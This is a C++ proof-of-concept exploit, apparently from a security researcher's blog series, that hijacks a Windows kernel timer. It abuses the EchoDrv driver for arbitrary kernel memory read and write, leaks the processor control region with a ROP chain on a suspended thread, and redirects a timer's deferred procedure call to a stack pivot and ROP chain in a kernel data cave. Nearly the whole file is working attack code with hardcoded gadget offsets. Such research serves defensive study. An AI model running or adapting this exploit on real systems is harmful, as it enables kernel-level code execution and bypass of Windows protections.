/**
 * @file ktimer_hijack.cpp
 *
 * @brief Proof of concept code for KTIMER hijacking.
 *        See https://gerr.re/posts/ktimer-hijack-pt1/
 *        and https://gerr.re/posts/ktimer-hijack-pt2/
 *
 * @author Gerr.re
 *
 * This work is licensed under the Creative Commons Attribution-NonCommercial 4.0 International License.
 * To view a copy of this license, visit http://creativecommons.org/licenses/by-nc/4.0/
 */

#include <iostream>
#include <stdlib.h>
#include <Windows.h>
#include <Psapi.h>

# pragma comment (lib,"psapi")

#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define ObjectThreadType 0x08

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

struct ARW {
	HANDLE targetProcess;
	LPVOID fromAddress;
	LPVOID toAddress;
	DWORD length;
	LPVOID padding;
	DWORD returnCode;
};

/**
* Initializes the EchoDrv
*/
BOOL initDriver(HANDLE hDriver) {
	LPVOID buf = malloc(4096);

	//Call IOCTL that sets the PID variable and gets past the DWORD check
	BOOL success = DeviceIoControl(hDriver, 0x9e6a0594, NULL, NULL, buf, 4096, NULL, NULL);
	if (!success) {
		printf("[!] DeviceIOControl 0x9e6a0594 failed: %d\n", GetLastError());
		CloseHandle(hDriver);
		return NULL;
	}

	return 1;
}

/**
* Reads DWORD64 from "where" in virtual memory
*/
DWORD64 read64(HANDLE hProcess, HANDLE hDriver, DWORD64 where) {
	LPVOID lpWhat = calloc(1, sizeof(DWORD64));
	ARW arw{};
	arw.fromAddress = (LPVOID)where;
	arw.length = 0x8;
	arw.targetProcess = hProcess;
	arw.toAddress = lpWhat;

	DeviceIoControl(hDriver, 0x60a26124, &arw, sizeof(ARW), &arw, sizeof(ARW), NULL, NULL);
	return ((DWORD64*)lpWhat)[0];
}

/**
* Writes DWORD64 "what" to DWORD64 "where" in virtual memory
*/
VOID write64(HANDLE hProcess, HANDLE hDriver, DWORD64 where, DWORD64 what) {
	LPVOID lpWhat = calloc(1, sizeof(DWORD64));
	((DWORD64*)lpWhat)[0] = what;

	ARW arw{};
	arw.fromAddress = lpWhat;
	arw.length = 0x8;
	arw.targetProcess = hProcess;
	arw.toAddress = (LPVOID)where;
	DeviceIoControl(hDriver, 0x60a26124, &arw, sizeof(ARW), &arw, sizeof(ARW), NULL, NULL);
}

/**
* Gets the base address of the supplied "drvName" using EnumDeviceDrivers()
*/
LPVOID getBaseAddr(LPCWSTR drvName) {
	LPVOID drivers[1024];
	DWORD cbNeeded;
	int nDrivers, i = 0;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
		WCHAR szDrivers[1024];
		nDrivers = cbNeeded / sizeof(drivers[0]);
		for (i = 0; i < nDrivers; i++) {
			if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
				if (wcscmp(szDrivers, drvName) == 0) {
					return drivers[i];
				}
			}
		}
	}
	return 0;
}

/**
* Gets the KTHREAD for the supplied "hThread" using NtQuerySystemInformation()
*/
PVOID getKThread(HANDLE hThread) {
	NTSTATUS nt_status;

	_NtQuerySystemInformation pNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
	if (!pNtQuerySystemInformation) {
		printf("[!] Error while resolving NtQuerySystemInformation: %d\n", GetLastError());
		return NULL;
	}

	ULONG systemHandleInfoSize = 4096;
	PSYSTEM_HANDLE_INFORMATION systemHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(systemHandleInfoSize);
	memset(systemHandleInfo, 0x00, sizeof(SYSTEM_HANDLE_INFORMATION));

	while ((nt_status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, systemHandleInfo, systemHandleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH) {
		systemHandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(systemHandleInfo, systemHandleInfoSize *= 10);
		if (systemHandleInfo == NULL) {
			printf("[!] Error allocating memory for NtQuerySystemInformation: %d\n", GetLastError());
			return NULL;
		}
	}
	if (nt_status) {
		printf("[!] Error calling NtQuerySystemInformation\n");
		return NULL;
	}

	int z = 0;
	for (unsigned int i = 0; i < systemHandleInfo->NumberOfHandles; i++) {
		if ((HANDLE)systemHandleInfo->Handles[i].HandleValue == hThread) {
			if (systemHandleInfo->Handles[i].ObjectTypeIndex == ObjectThreadType) {
				z++;
			}
		}
	}

	int array_size = z - 1;
	PVOID* kThreadArray = new PVOID[array_size];
	z = 0;
	for (unsigned int i = 0; i < systemHandleInfo->NumberOfHandles; i++) {
		if ((HANDLE)systemHandleInfo->Handles[i].HandleValue == hThread) {
			if (systemHandleInfo->Handles[i].ObjectTypeIndex == ObjectThreadType) {
				kThreadArray[z] = systemHandleInfo->Handles[i].Object;
				z++;
			}
		}
	}

	return kThreadArray[array_size];
}

/**
* Dummy function used to spawn dummy thread
*/
void dummyFunction() {
	return;
}

/**
* Creates a dummy thread used in the KernelForge technique
*/
HANDLE createdummyThread() {
	HANDLE dummyThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dummyFunction, NULL, CREATE_SUSPENDED, NULL);

	if (dummyThread == INVALID_HANDLE_VALUE) {
		return NULL;
	}

	SetThreadAffinityMask(dummyThread, 0x1 << 0); //use first processor that contains the TimerTable
	return dummyThread;
}

/**
* Gets the KPCR for the current thread using KernelForge technique
*/
DWORD64 getKpcr(HANDLE hProcess, HANDLE hDriver, DWORD64 ntBase) {
	// 1) Create a "dummy" thread in a suspended state using CreateThread
	HANDLE dummyThread = createdummyThread();
	if (!dummyThread) {
		printf("[!] Error creating dummy thread\n");
		return NULL;
	}
	printf("[+] Created dummy thread: %d\n", dummyThread);

	// 2) Get the KTHREAD object for the thread using NtQuerySystemInformation
	PVOID kThread = getKThread(dummyThread);
	if (!kThread) {
		printf("[!] Error getting KTHREAD address\n");
		return NULL;
	}
	printf("[+] KTHREAD at: %p\n", kThread);

	// 3) Locate the return address of nt!KiApcInterrupt+0x35c on the thread stack
	DWORD64 kThreadStackBase = (DWORD64)kThread + 0x38;
	DWORD64 stackBase = read64(hProcess, hDriver, kThreadStackBase);
	printf("[+] stackBase at: %p\n", stackBase);

	DWORD64 retAddr = 0;

	for (int i = 0x8; i < 0x7000 - 0x8; i += 0x8) {
		ULONG64 value = read64(hProcess, hDriver, stackBase - i);

		if ((value & 0xfffff00000000000) == 0xfffff00000000000) {
			// nt!KiApcInterrupt+0x35c?
			if (value == ntBase + 0x43703c) {
				retAddr = stackBase - i;
				printf("[+] Stack address of nt!KiApcInterrupt+0x35c: %p\n", retAddr);
				break;
			}
		}
		value = 0;
	}

	// 4) Write our ROP chain that uses nt!KeGetPcr to write the KPCR to our usermode address.
	//      We end the ROP chain with an API call to nt!ZwTerminateThread to gracefully continue.
	DWORD64 kPCR = NULL;

	write64(hProcess, hDriver, retAddr, (DWORD64)ntBase + 0x3d73a0);       // nt!KeGetPcr (mov rax, gs:[0x18]; ret;)
	write64(hProcess, hDriver, retAddr + 0x8, (DWORD64)ntBase + 0x20c721); // 0x14020c721: pop rcx ; ret  ;  (1 found)
	write64(hProcess, hDriver, retAddr + 0x10, (DWORD64)&kPCR);
	write64(hProcess, hDriver, retAddr + 0x18, (DWORD64)ntBase + 0x209d0d); // 0x140209d0d: mov qword [rcx], rax ; ret  ;  (1 found)
	write64(hProcess, hDriver, retAddr + 0x20, (DWORD64)ntBase + 0x20c721); // 0x14020c721: pop rcx ; ret  ;  (1 found)
	write64(hProcess, hDriver, retAddr + 0x28, (DWORD64)dummyThread);
	write64(hProcess, hDriver, retAddr + 0x30, (DWORD64)ntBase + 0x3275f2); // 0x1403275f2: pop rdx; ret;  (1 found)
	write64(hProcess, hDriver, retAddr + 0x38, 0x0);
	write64(hProcess, hDriver, retAddr + 0x40, (DWORD64)ntBase + 0x2038f5); // 0x1402038f5: pop rax ; ret  ;  (1 found)
	write64(hProcess, hDriver, retAddr + 0x48, (DWORD64)ntBase + 0x42dfc0); // nt!ZwTerminateThread
	write64(hProcess, hDriver, retAddr + 0x50, (DWORD64)ntBase + 0x201b7b); // 0x140201b7b: ret  ;  (1 found) ALIGN STACK 16 bytes
	write64(hProcess, hDriver, retAddr + 0x58, (DWORD64)ntBase + 0x2024e2); // 0x1402024e2: jmp rax ;  (1 found)

	// 5) Resume the dummyThread to trigger the ROP chain
	ResumeThread(dummyThread);

	// Sleep s.t. thread has time to execute
	Sleep(1000);

	return kPCR;
}

/**
* Decrypts the DPC value in the KTIMER object
*/
DWORD64 decryptDpc(HANDLE process_handle, HANDLE driver_handle, DWORD64 nt_base, DWORD64 kTimer, DWORD64 encryptedDpc) {
	DWORD64 kiWaitNever = read64(process_handle, driver_handle, (DWORD64)nt_base + 0xd1de48);
	DWORD64 kiWaitAlways = read64(process_handle, driver_handle, (DWORD64)nt_base + 0xd1e0d8);

	DWORD64 dpc = encryptedDpc;
	dpc ^= kiWaitNever;
	dpc = _rotl64(dpc, kiWaitNever & 0xff);
	dpc ^= kTimer;
	dpc = _byteswap_uint64(dpc);
	dpc ^= kiWaitAlways;
	return dpc;
}

int main() {
	LPVOID ntBase = getBaseAddr(L"ntoskrnl.exe");
	printf("[+] Got NT base using EnumDeviceDrivers: %p\n", ntBase);

	// 1) Use EchoDrv as Kernel ARW
	HANDLE hDriver = CreateFile(L"\\\\.\\EchoDrv", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Error while opening a handle to the driver: %d\n", GetLastError());
		return 0;
	}
	printf("[+] Successfully obtained the handle to EchoDrv used for Kernel ARW: %d\n", hDriver);

	if (!initDriver(hDriver)) {
		printf("[!] Error initialising the driver: %d\n", GetLastError());
		return 0;
	}

	HANDLE hProcess = GetCurrentProcess();

	// 2) Use KernelForge technique to leak KPCR using a ROP chain in a dummy thread (HVCI compliant)
	DWORD64 kPcr = getKpcr(hProcess, hDriver, (DWORD64)ntBase);
	if (!kPcr) {
		printf("[!] Error while trying to find KPCR\n");
		return 1;
	}
	printf("[+] Got KPCR using KernelForge technique: %p\n", kPcr);

	// 3) Locate KTIMER entry handling nt!ExpCenturyDpcRoutine
	DWORD64 kUserSharedData = 0xfffff78000000000;
	DWORD64 interruptTime = read64(hProcess, hDriver, kUserSharedData + 0x8); //KUSER_SHARED_DATA.InterruptTime
	DWORD64 systemTime = read64(hProcess, hDriver, kUserSharedData + 0x14);   //KUSER_SHARED_DATA.SystemTime
	DWORD64 kTimer, dueTime, listHead, flink = 0;
	for (int i = 0; i < 0xff; i++) {
		//                KPRCB   TimTab   TimEnt  [1]     [i] |KTIM|  LIST
		listHead = kPcr + 0x180 + 0x3c00 + 0x200 + 0x2000 + i * 0x20 + 0x8;
		flink = read64(hProcess, hDriver, listHead);
		kTimer = flink - 0x20;
		int listEntry = 0;

		while (flink != listHead) {
			dueTime = read64(hProcess, hDriver, kTimer + 0x18);
			if (((systemTime - interruptTime + dueTime) & 0x0220000000000000) == 0x0220000000000000) {
				printf("[+] Found likely kTimer entry for nt!ExpCenturyDpcRoutine: %p at TimerTable[1][%d], LIST_ENTRY #%d\n", kTimer, i, listEntry);
				goto found;
			}
			flink = read64(hProcess, hDriver, flink);
			listEntry++;
			kTimer = flink - 0x20;
		}
	}
found:
	DWORD64 encryptedDpc = read64(hProcess, hDriver, kTimer + 0x30);
	printf("[+] Encrypted DPC: %p\n", encryptedDpc);

	// 4) Decrypt the DPC and check whether we actually found the ExpCenturyDpc, and thus the correct KTMIMER entry
	DWORD64 dpc = decryptDpc(hProcess, hDriver, (DWORD64)ntBase, kTimer, encryptedDpc);
	DWORD64 expCenturyDpcRoutine = (DWORD64)ntBase + 0x60cff0;
	DWORD64 dpcRoutine = read64(hProcess, hDriver, dpc + 0x18);
	if (dpcRoutine == expCenturyDpcRoutine) {
		printf("[+] Found ExpCenturyDpc: %p\n", dpc);
	}
	else {
		printf("[!] Did not find ExpCenturyDpc, exiting...\n");
		return 0;
	}

	// 5) Hijack the KTIMER.DPC.DeferredRoutine
	DWORD64 codeCave = (DWORD64)ntBase + 0xd1c000 - 0x238 + 1; // at end of .data section

	// new stack address
	write64(hProcess, hDriver, dpc + 0x10, codeCave);

	// KTIMER.DPC.DeferredRoutine -> stackpivot
	write64(hProcess, hDriver, dpc + 0x18, (DWORD64)ntBase + 0x42ce28); // 0x42ce28: mov rsp, qword [rcx+0x10] ; jmp rdx ; (1 found)

	// will end up in rdx
	write64(hProcess, hDriver, dpc + 0x20, (DWORD64)ntBase + 0x21a154); // 0x21a154: nop; ret;  (1 found)
	write64(hProcess, hDriver, dpc + 0x28, 0x4242424242424242); // SystemArgument1
	write64(hProcess, hDriver, dpc + 0x30, 0x4343434343434343); // SystemArgument2
	write64(hProcess, hDriver, dpc + 0x38, 0x4444444444444444); // DpcData

	printf("[+] Constructing ROP chain\n");
	// align rsp
	write64(hProcess, hDriver, codeCave, (DWORD64)ntBase + 0x868131);        // 0x868131: pop r8; ret; (1 found)
	write64(hProcess, hDriver, codeCave + 0x8, codeCave + 0x180 - 1);        // 0xfffffffffffffffe
	write64(hProcess, hDriver, codeCave + 0x10, (DWORD64)ntBase + 0x368d4e); // 0x368d4e: and rsp, qword[r8]; inc word[rcx + 0x20]; add rsp, 0x28; ret; (1 found)
	codeCave--; //alignment

	// nt!DbgPrintEx
	write64(hProcess, hDriver, codeCave + 0x40, (DWORD64)ntBase + 0x7bb073); // 0x7bb073: pop rcx ; ret ; (1 found)
	write64(hProcess, hDriver, codeCave + 0x48, 77);						 // DPFLTR_IHVDRIVER_ID
	write64(hProcess, hDriver, codeCave + 0x50, (DWORD64)ntBase + 0x72b676); // 0x72b676: pop rdx; ret; (1 found)
	write64(hProcess, hDriver, codeCave + 0x58, 0x0);                        // Level = 0
	write64(hProcess, hDriver, codeCave + 0x60, (DWORD64)ntBase + 0x868131); // 0x868131: pop r8; ret; (1 found)
	write64(hProcess, hDriver, codeCave + 0x68, codeCave + 0x200);           // pointer to STRING
	write64(hProcess, hDriver, codeCave + 0x70, (DWORD64)ntBase + 0x447723); // 0x447723: pop r9 ; ret ; (1 found)
	write64(hProcess, hDriver, codeCave + 0x78, 0x0);                        
	write64(hProcess, hDriver, codeCave + 0x80, (DWORD64)ntBase + 0x2cc330); // nt!DbgPrintEx
	write64(hProcess, hDriver, codeCave + 0x88, (DWORD64)ntBase + 0x67bfaf); // 0x67bfaf: add rsp, 0x28 ; ret ; (1 found)

	// restore execution flow from r14
	write64(hProcess, hDriver, codeCave + 0xb8, (DWORD64)ntBase + 0x687534); // 0x687534: pop rax; ret; (1 found)
	write64(hProcess, hDriver, codeCave + 0xc0, (DWORD64)ntBase + 0x687534); // 0x687534: pop rax; ret; (1 found)
	write64(hProcess, hDriver, codeCave + 0xc8, (DWORD64)ntBase + 0x412334); // 0x412334: mov rcx, r14; call rax; (1 found)
	write64(hProcess, hDriver, codeCave + 0xd0, (DWORD64)ntBase + 0x72b676); // 0x72b676: pop rdx; ret; (1 found)
	write64(hProcess, hDriver, codeCave + 0xd8, codeCave + 0x1a8 - 0x8);     // pointer to rsp offset minus 0x8
	write64(hProcess, hDriver, codeCave + 0xe0, (DWORD64)ntBase + 0x868131); // 0x868131: pop r8; ret; (1 found)
	write64(hProcess, hDriver, codeCave + 0xe8, codeCave + 0x1c0);           // some writeable address
	write64(hProcess, hDriver, codeCave + 0xf0, (DWORD64)ntBase + 0x28ed93); // 0x28ed93: sub rcx, qword[rdx + 0x08]; mov qword[r8 + 0x08], rcx; ret; (1 found)
	DWORD64 ptrRsp = codeCave + 0xf8;
	write64(hProcess, hDriver, codeCave + 0xf8, (DWORD64)ntBase + 0x3f3a37); // 0x3f3a37: push rcx ; and al, 0x60 ; add rsp, 0x58 ; ret ; (1 found)
	write64(hProcess, hDriver, codeCave + 0x150, (DWORD64)ntBase + 0x72b676); // 0x72b676: pop rdx; ret; (1 found)
	write64(hProcess, hDriver, codeCave + 0x158, (DWORD64)ntBase + 0x21a154); // 0x21a154: nop; ret;  (1 found)
	write64(hProcess, hDriver, codeCave + 0x160, (DWORD64)ntBase + 0x7bb073); // 0x7bb073: pop rcx ; ret ; (1 found)
	write64(hProcess, hDriver, codeCave + 0x168, ptrRsp - 0x10);              // pointer to rsp minus 0x10
	write64(hProcess, hDriver, codeCave + 0x170, (DWORD64)ntBase + 0x42ce28); // 0x42ce28: mov rsp, qword [rcx+0x10] ; jmp rdx ; (1 found)

	// DATA
	write64(hProcess, hDriver, codeCave + 0x180, 0xfffffffffffffffe); // mask to align stack
	write64(hProcess, hDriver, codeCave + 0x1a8, 0x2a0);              // offset between r14 and original rsp
	write64(hProcess, hDriver, codeCave + 0x200, 0x682052454d49544b); // STRING
	write64(hProcess, hDriver, codeCave + 0x208, 0x7962206b63616a69); // STRING
	write64(hProcess, hDriver, codeCave + 0x210, 0x65722e7272654720); // STRING
	write64(hProcess, hDriver, codeCave + 0x218, 0x000000000000000a); // STRING

	printf("[+] Hijacked DpcRoutine with stackpivot to ROP chain\n");

	// 6) Set KTIMER.DueTime to activate the hijacked DeferredRoutine
	DWORD64 ticksPerSecond = 10000000; //100ns
	DWORD64 seconds = 10;
	DWORD64 fireTime = interruptTime + seconds * ticksPerSecond;

	write64(hProcess, hDriver, kTimer + 0x18, fireTime);
	printf("[+] Set DueTime to %d seconds from now.\n", seconds);

	printf("[+] Bomb has been planted...\n");

	return 1;
}
